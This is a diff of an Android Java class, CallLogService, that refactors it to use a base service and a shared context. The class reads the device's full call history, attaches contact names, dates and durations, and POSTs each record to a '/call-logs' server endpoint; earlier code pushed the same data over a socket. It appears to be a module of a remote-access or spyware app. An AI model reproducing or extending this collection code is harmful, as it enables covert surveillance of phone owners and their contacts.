@@ -18,17 +18,16 @@ import http.Http;
 import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
 import static android.content.Intent.FLAG_ACTIVITY_NO_HISTORY;
 
-public class CallLogService extends Thread implements Runnable {
+public class CallLogService extends BaseService{
 
     private static String TAG = "CallLogService";
 
     private static final String POSTURL = "/call-logs";
     private CommonParams commonParams;
-    private Client client;
     private int numlogs;
 
     public CallLogService(Client client, int numlogs) {
-        this.client = client;
+        setContext(client);
         this.numlogs = numlogs;
         this.commonParams = new CommonParams(client);
     }
@@ -43,7 +42,7 @@ public class CallLogService extends Thread implements Runnable {
     private void getCallLogs() {
 
 
-        if (ContextCompat.checkSelfPermission(client, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
 
             HashMap start = new HashMap();
             start.put("event", "getcallhistory:started");
@@ -57,7 +56,7 @@ public class CallLogService extends Thread implements Runnable {
 
             String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
             Uri callUri = Uri.parse("content://call_log/calls");
-            Cursor managedCursor = client.getApplicationContext().getContentResolver().query(callUri, null, null, null, strOrder);
+            Cursor managedCursor = context.getApplicationContext().getContentResolver().query(callUri, null, null, null, strOrder);
             int id = managedCursor.getColumnIndex(CallLog.Calls._ID);
             int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
             int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
@@ -67,7 +66,7 @@ public class CallLogService extends Thread implements Runnable {
             if (managedCursor.moveToFirst()) {
                 do {
                     String phNumber = managedCursor.getString(number);
-                    String nameS = client.getContactName(client.getApplicationContext(), phNumber);
+                    String nameS = getContactName(context.getApplicationContext(), phNumber);
                     String callType = managedCursor.getString(type);
                     String callDate = managedCursor.getString(date);
                     Date callDayTime = new Date(Long.valueOf(callDate));
@@ -82,9 +81,6 @@ public class CallLogService extends Thread implements Runnable {
                         p.put("name", nameS);
                         p.put("date", dt.format(callDayTime));
                         p.put("duration", callDuration);
-
-//                    JSONObject obj = new JSONObject(p);
-//                    client.getSocket().emit("call_log:push", obj);
 
                         Http req = new Http();
                         req.setMethod("POST");
@@ -122,11 +118,8 @@ public class CallLogService extends Thread implements Runnable {
             doneSMS.setMethod("POST");
             doneSMS.setParams(noPermit);
             doneSMS.execute();
-            //ask permissions
-            Intent i = new Intent(client, MainActivity.class);
-            i.addFlags(FLAG_ACTIVITY_NEW_TASK);
-            i.addFlags(FLAG_ACTIVITY_NO_HISTORY);
-            client.startActivity(i);
+
+            requestPermissions();
         }
 
     }
